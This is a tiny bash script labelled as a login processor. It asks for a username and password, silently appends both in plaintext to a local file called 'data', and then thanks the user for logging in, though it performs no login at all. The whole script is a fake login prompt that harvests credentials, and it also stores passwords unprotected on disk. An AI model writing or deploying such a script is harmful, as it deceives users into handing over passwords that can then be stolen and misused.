#!/bin/bash
#login procceser

echo "Please Enter Your data"
read -p 'Username: ' username
read -sp 'Password: ' userpass


echo "User= $username ========= Pass=$userpass" >> data &

echo "Thanks You $username You are about to login ^__^"
